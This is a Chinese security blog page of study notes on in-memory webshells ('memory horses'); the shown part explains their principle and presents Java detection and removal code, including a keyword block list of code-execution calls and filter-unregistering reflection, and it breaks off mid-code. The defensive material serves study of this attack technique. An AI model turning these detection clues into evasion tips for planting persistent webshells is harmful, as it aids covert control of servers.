

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon/favicon.jpg">
  <link rel="icon" href="/img/favicon/favicon.jpg">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="BadWolf">
  <meta name="keywords" content="">
  
    <meta name="description" content="本篇文章为常见内存马学习笔记，介绍了php内存马、Python内存马以及Java内存马基本原理及具体实现。">
<meta property="og:type" content="article">
<meta property="og:title" content="内存马学习">
<meta property="og:url" content="https://genioco.github.io/2022/05/06/Learn/%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/index.html">
<meta property="og:site_name" content="BadWolf&#39;s Blog">
<meta property="og:description" content="本篇文章为常见内存马学习笔记，介绍了php内存马、Python内存马以及Java内存马基本原理及具体实现。">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://img-blog.csdnimg.cn/f48ed242292b4081bb09e54ea03f1878.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/10f20ee4ee654bcf9d85ba3cd046eccf.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/504f72b4cd7c44d983dcf88da8bef40c.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/7102dd16e6db4414a06c5f782dd03abd.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/8e38a1bd0e71442e8fae9d6b325629a1.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/0de5ae8f12df4da997c3c2799ba07e44.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/06dd557080dc4a538085154b10e7f015.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/e707a90064db430089a5275bcf85a821.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/8183b93a3a084666831279f71d9b9bf5.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/45b0e83a4b484d339bb2b03bccfb9e25.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/a4b3f63351f74c5980145d832fe8fb70.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/539d27ecc22f4e6891a478530328c717.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/63f7ad2bcda0490391536a3d91e22c41.png">
<meta property="og:image" content="https://img2020.cnblogs.com/blog/1511657/202110/1511657-20211021113259065-983482909.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/431aa08e5b5845289cd7993db4f43527.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/2c9a1c8f824d43ecb80632cc8b09e642.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/6f604d5056ef4a2d8286b50136c82502.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/31ccc0840f1d47bc8363516ad34c19c0.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/49fdc1f5acba49d6a01ec9b33b40f5d9.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/2382592a676b4cc6aa50d694b01522fe.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/fdcac806944e47249ee680a72f79fa8d.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/f13a891e866a4c378d6943996a5946fa.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/007b92c20fbf42fb8d69fd3e1923bf5d.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/139c1a2ab66f46a4a823916f2c1040e3.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/08f8d96e4dc04d108fd5bf4dcbecea7a.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/d598838334fe42478756fafc44d07d11.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/fce0a000e60f4ab681d83704e6272828.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/71508e147e2c4c3b93609a4bfe26be10.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/5cd2320cf9074c16b264bf39aaf9ba1b.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/1ca351e3f37b464fa49aa85444d19c0c.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/e577bb46d9b14f33ad8a7c4254da566c.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/94f9c7c5760945aeb8e90f09562d2567.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/1de515b2aa1e4be2aa3960eda445d011.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/825f12fe7129459393e433dfabbb3c8c.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/5f334403d9ec4b48a3164cad6229a32b.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/0fc87665a1154d238f5b1aceadb805fd.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/a392a22cda424e9ab166cff275f36144.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/007b92c20fbf42fb8d69fd3e1923bf5d.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/76f8bb0f3163448eb9a59c7982321c15.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/ae11b2b2a0ae4e37a43e8a5539a64c32.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/8a393fab6e7e43e087720fd11261f7bc.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/cdf1d2dea72c4d6babe4cd2fc43fb099.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/42f3d54c96f34159bff4bedf699b60a8.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/aef0047e00d94c569cbae9955dcd228a.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/1db457ebdaf540b49f909d11767d5786.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/09bc3378523d40fba5038cc81223abed.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/49f8e9b3f2e242af885be00d88060bdd.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/88367f50d282424bae014e6dfb31fe21.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/1e62487154c6408aa67a5276a3ce3950.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/ea5113f181574a348cad14ededf0f8af.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/739ba98a0a1f46088db63efe5a4a840e.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/f8cef3cc2c984ccf809ebe85039ed995.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/b34559198e5a4ab8ae08a8a8df82b224.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/fb2b6806e04d47c7822052bf1c5e0ddb.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/ca2956e2a4b04b62b57b6d3310bd0228.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/5afcb886ab9a406aa4d353996f854a88.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/a554d4146b3b4807b1606d552f0ff943.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/e1e6e1dc19f54c6f92b22bbbf908f1ee.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/2140b15aac48432597a45f36e3ce7939.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/44323cce984b4183970c93a6696f9aa8.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/96ee85d6234b48d08f6427225cdbff8d.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/55e9ee08aed34e44abaee0a7b742aeab.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/ecdd8fda9b27401c9bd649932f71b7a3.png">
<meta property="article:published_time" content="2022-05-06T06:23:00.000Z">
<meta property="article:modified_time" content="2024-07-15T07:32:37.879Z">
<meta property="article:author" content="BadWolf">
<meta property="article:tag" content="内存马">
<meta property="article:tag" content="Java">
<meta property="article:tag" content="php">
<meta property="article:tag" content="Python">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://img-blog.csdnimg.cn/f48ed242292b4081bb09e54ea03f1878.png">
  
  
    <meta name="referrer" content="no-referrer-when-downgrade">
  
  
  <title>内存马学习 - BadWolf&#39;s Blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  



  
<link rel="stylesheet" href="/js/shubiao.css">
<link rel="stylesheet" href="/js/scroll.css">
<link rel="stylesheet" href="/js/gradient.css">



  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"genioco.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":80,"cursorChar":"|","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":"839133d5bbdb7688edec52dfcde2a75b","google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  
    <!-- Baidu Analytics -->
    <script async>
      if (!Fluid.ctx.dnt) {
        var _hmt = _hmt || [];
        (function() {
          var hm = document.createElement("script");
          hm.src = "https://hm.baidu.com/hm.js?839133d5bbdb7688edec52dfcde2a75b";
          var s = document.getElementsByTagName("script")[0];
          s.parentNode.insertBefore(hm, s);
        })();
      }
    </script>
  

  
    <!-- Google tag (gtag.js) -->
    <script async>
      if (!Fluid.ctx.dnt) {
        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
          window.dataLayer = window.dataLayer || [];
          function gtag() {
            dataLayer.push(arguments);
          }
          gtag('js', new Date());
          gtag('config', '');
        });
      }
    </script>
  

  

  

  

  



  
<meta name="generator" content="Hexo 7.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>BadWolf&#39;s Blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="内存马学习"></span>
          
        </div>

        
          
  <div class="mt-3">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-author" aria-hidden="true"></i>
        BadWolf
      </span>
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2022-05-06 14:23" pubdate>
          2022年5月6日 下午
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          18k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          155 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">内存马学习</h1>
            
              <p id="updated-time" class="note note-info" style="">
                
                  
                    <!-- compatible with older versions-->
                    本文最后更新于：2024年7月15日 下午
                  
                
              </p>
            
            
              <div class="markdown-body">
                
                <meta name="referrer" content="no-referrer">

<h1 id="内存马学习"><a href="#内存马学习" class="headerlink" title="内存马学习"></a>内存马学习</h1><h2 id="内存马介绍"><a href="#内存马介绍" class="headerlink" title="内存马介绍"></a>内存马介绍</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">内存webshell相比于常规webshell更容易躲避传统安全监测设备的检测，通常被用来做持久化，规避检测，持续驻留目标服务器。无文件攻击、内存Webshell、进程注入等基于内存的攻击手段也受到了大多数攻击者青睐。<br></code></pre></td></tr></table></figure>

<h2 id="内存马原理"><a href="#内存马原理" class="headerlink" title="内存马原理"></a>内存马原理</h2><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">为Webshell脚本类内存马。其原理是先由客户端发起一个web请求，中间件的各个独立的组件如Listener、<span class="hljs-built_in">Filter</span>、Servlet等组件会在请求过程中做监听、判断、过滤等操作，内存马利用请求过程在内存中修改已有的组件或者动态注册一个新的组件，插入恶意的shellcode达到持久化的控制服务器。<br></code></pre></td></tr></table></figure>

<h2 id="内存马检测"><a href="#内存马检测" class="headerlink" title="内存马检测"></a>内存马检测</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">上报，重启<br>duckmemoryscan<br>看日志，修漏洞，恢复环境<br></code></pre></td></tr></table></figure>

<p>内存马检测一般利用Java Agent技术遍历所有已经加载到内存的class，判断是否未内存马。</p>
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> Transformer <span class="hljs-keyword">implements</span> ClassFileTransformer &#123;<br>	<span class="hljs-keyword">public</span> <span class="hljs-keyword">byte</span>[] transform(ClassLoader classLoader, String s, <span class="hljs-keyword">Class</span>&lt;?&gt; aClass, ProtectionDomain protectionDomain, <span class="hljs-keyword">byte</span>[] bytes) <span class="hljs-keyword">throws</span> IllegalClassFormatException &#123;<br>	    <span class="hljs-comment">// 识别内存马</span><br>	    <span class="hljs-keyword">if</span>(isMemshell(aClass,bytes))&#123;<br>	        <span class="hljs-comment">// 查杀内存马</span><br>	        <span class="hljs-keyword">byte</span>[] newClassByte = killMemshell(aClass,bytes);<br>	        <span class="hljs-keyword">return</span> newClassByte;<br>	    &#125;<span class="hljs-keyword">else</span>&#123;<br>	        <span class="hljs-keyword">return</span> bytes;<br>	    &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="内存马识别"><a href="#内存马识别" class="headerlink" title="内存马识别"></a>内存马识别</h3><ul>
<li><p>filter名字</p>
<p>​		内存马的Filter名一般比较特别，有<code>shell</code>或者随机数等关键字。这个特征稍弱，因为这取决于内存马的构造者的习惯，构造完全可以设置一个看起来很正常的名字。</p>
</li>
<li><p>filter优先级</p>
<p>​		为了确保内存马在各种环境下都可以访问，往往需要把filter匹配优先级调至最高，这在shiro反序列化中是刚需。但其他场景下就非必须，只能做一个可疑点。</p>
</li>
<li><p>访问不存在目录，但是响应返回200</p>
</li>
<li><p>对比<code>web.xml</code>有没有相应的配置。</p>
<p>​		内存马的Filter是动态注册的，所以在web.xml中肯定没有配置，这也是个可以的特征。但servlet 3.0引入了<code>@WebFilter</code>标签方便开发这动态注册Filter。这种情况也存在没有在web.xml中显式声明，这个特征可以作为较强的特征。</p>
</li>
<li><p>特殊的classloader加载</p>
<p>​	我们都知道Filter也是class，也是必定有特定的<code>classloader</code>加载。一般来说，正常的Filter都是由中间件的<code>WebappClassLoader</code>加载的。反序列化漏洞喜欢利用<code>TemplatesImpl</code>和<code>bcel</code>执行任意代码。所以这些class往往就是以下这两个：</p>
<ul>
<li><p>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl$TransletClassLoader</p>
</li>
<li><p>com.sun.org.apache.bcel.internal.util.ClassLoader</p>
</li>
</ul>
</li>
<li><p>对应的classloader路径下没有class文件</p>
<p>​        所谓内存马就是代码驻留内存中，本地无对应的class文件。所以我们只要检测Filter对应的<code>ClassLoader</code>目录下是否存在class文件。</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">classFileIsExists</span><span class="hljs-params">(Class clazz)</span>&#123;<br>    <span class="hljs-keyword">if</span>(clazz == <span class="hljs-literal">null</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span> clazz.getName();<br>    <span class="hljs-type">String</span> <span class="hljs-variable">classNamePath</span> <span class="hljs-operator">=</span> className.replace(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-string">&quot;/&quot;</span>) + <span class="hljs-string">&quot;.class&quot;</span>;<br>    <span class="hljs-type">URL</span> <span class="hljs-variable">is</span> <span class="hljs-operator">=</span> clazz.getClassLoader().getResource(classNamePath);<br>    <span class="hljs-keyword">if</span>(is == <span class="hljs-literal">null</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<ul>
<li>Filter的<code>doFilter</code>方法中是否村咋恶意代码</li>
</ul>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">boolean</span> <span class="hljs-title function_">isMemshell</span>(<span class="hljs-params"><span class="hljs-title class_">Class</span> targetClass,byte[] targetClassByte</span>)&#123;<br>    <span class="hljs-title class_">ClassLoader</span> classLoader = <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">if</span>(targetClass.<span class="hljs-title function_">getClassLoader</span>() != <span class="hljs-literal">null</span>) &#123;<br>        classLoader = targetClass.<span class="hljs-title function_">getClassLoader</span>();<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        classLoader = <span class="hljs-title class_">Thread</span>.<span class="hljs-title function_">currentThread</span>().<span class="hljs-title function_">getContextClassLoader</span>();<br>    &#125;<br><br>    <span class="hljs-title class_">Class</span> clsFilter =  <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">try</span> &#123;<br>        clsFilter = classLoader.<span class="hljs-title function_">loadClass</span>(<span class="hljs-string">&quot;javax.servlet.Filter&quot;</span>);<br>    &#125;<span class="hljs-keyword">catch</span> (<span class="hljs-title class_">Exception</span> e)&#123;<br>    &#125;<br><br>    <span class="hljs-comment">// 是否是filter</span><br>    <span class="hljs-keyword">if</span>(clsFilter != <span class="hljs-literal">null</span> &amp;&amp; clsFilter.<span class="hljs-title function_">isAssignableFrom</span>(targetClass))&#123;<br>        <span class="hljs-comment">// class loader 是不是Templates或bcel</span><br>        <span class="hljs-keyword">if</span>(classLoader.<span class="hljs-title function_">getClass</span>().<span class="hljs-title function_">getName</span>().<span class="hljs-title function_">contains</span>(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl$TransletClassLoader&quot;</span>)<br>                || classLoader.<span class="hljs-title function_">getClass</span>().<span class="hljs-title function_">getName</span>().<span class="hljs-title function_">contains</span>(<span class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span>))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br><br>        <span class="hljs-comment">// 是否存在ClassLoader的文件目录下存在对应的class文件</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_">classFileIsExists</span>(targetClass))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>        <br>        <span class="hljs-comment">// filter是否包含恶意代码。</span><br>        <span class="hljs-title class_">String</span>[] blacklist = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-string">&quot;defineClass&quot;</span>,<span class="hljs-string">&quot;invoke&quot;</span>&#125;;<br>        <span class="hljs-title class_">String</span> clsJavaCode = <span class="hljs-title class_">FernflowerUtils</span>.<span class="hljs-title function_">decomper</span>(targetClass,targetClassByte);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-title class_">String</span> <span class="hljs-attr">b</span>:blacklist)&#123;<br>            <span class="hljs-keyword">if</span>(clsJavaCode.<span class="hljs-title function_">contains</span>(b))&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="内存马查杀"><a href="#内存马查杀" class="headerlink" title="内存马查杀"></a>内存马查杀</h3><ul>
<li>清除内存马中的Filter的恶意代码</li>
</ul>
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">byte</span>[] killMemshell(<span class="hljs-keyword">Class</span> clsMemshell,<span class="hljs-keyword">byte</span>[] byteMemshell) <span class="hljs-keyword">throws</span> Exception&#123;<br>    <span class="hljs-keyword">File</span> <span class="hljs-keyword">file</span> = <span class="hljs-keyword">new</span> <span class="hljs-keyword">File</span>(String.format(<span class="hljs-string">&quot;/tmp/%s.class&quot;</span>,clsMemshell.getName()));<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">file</span>.exists())&#123;<br>        <span class="hljs-keyword">file</span>.<span class="hljs-keyword">delete</span>();<br>    &#125;<br>    FileOutputStream fos  = <span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-keyword">file</span>.getAbsoluteFile());<br>    fos.<span class="hljs-keyword">write</span>(byteMemshell);<br>    fos.flush();<br>    fos.close();<br>    ClassPool cp = ClassPool.getDefault();<br>    cp.insertClassPath(<span class="hljs-string">&quot;/tmp/&quot;</span>);<br>    CtClass cc = cp.getCtClass(clsMemshell.getName());<br>    CtMethod m = cc.getDeclaredMethod(<span class="hljs-string">&quot;doFilter&quot;</span>);<br>    m.addLocalVariable(<span class="hljs-string">&quot;elapsedTime&quot;</span>, CtClass.longType);<br>    <span class="hljs-comment">// 正确覆盖代码：</span><br>    <span class="hljs-comment">// m.setBody(&quot;&#123;$3.doFilter($1,$2);&#125;&quot;);</span><br>    <span class="hljs-comment">// 方便演示代码：</span><br>    m.setBody(<span class="hljs-string">&quot;&#123;$2.getWriter().write(\&quot;Your memory horse has been killed by c0ny1\&quot;);&#125;&quot;</span>);<br>    <span class="hljs-keyword">byte</span>[] byteCode = cc.toBytecode();<br>    cc.detach();<br>    <span class="hljs-keyword">return</span> byteCode;<br>&#125;<br></code></pre></td></tr></table></figure>



<ul>
<li><p>模拟中间件注销Filter</p>
<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-comment">//反序列化执行代码反射获取到StandardContext</span><br>Object standardContext = <span class="hljs-params">...</span>;<br>Field _filterConfigs = standardContext.getClass().getDeclaredField(<span class="hljs-string">&quot;filterConfigs&quot;</span>);<br>_filterConfigs.setAccessible(<span class="hljs-literal">true</span>);<br>Object filterConfigs = _filterConfigs.get(standardContext);<br><span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">String</span>, ApplicationFilterConfig&gt; filterConfigMap = (<span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">String</span>, ApplicationFilterConfig&gt;)filterConfigs;<br>for(<span class="hljs-built_in">Map</span>.Entry&lt;<span class="hljs-built_in">String</span>, ApplicationFilterConfig&gt; <span class="hljs-built_in">map</span> : filterConfigMap.entrySet())&#123;<br>    <span class="hljs-built_in">String</span> filterName = <span class="hljs-built_in">map</span>.getKey();<br>    ApplicationFilterConfig filterConfig = <span class="hljs-built_in">map</span>.getValue();<br>    Filter filterObject = filterConfig.getFilter();<br>    <span class="hljs-comment">// 如果是内存马的filter名</span><br>    <span 